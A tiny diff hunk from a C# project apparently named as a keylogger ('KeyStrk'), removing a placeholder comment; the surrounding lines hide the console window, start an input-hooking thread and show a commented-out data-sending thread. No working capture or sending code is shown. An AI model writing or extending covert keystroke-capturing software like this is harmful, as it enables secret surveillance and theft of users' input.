@@ -28,7 +28,7 @@ namespace KeyStrk
             // Hide Console 
             ShowWindow(handle, SW_HIDE);
 
-            // ??
+            
 
             Thread hookThread = new Thread(HookInput);
             // Thread sendData = new Thread(sendThread);
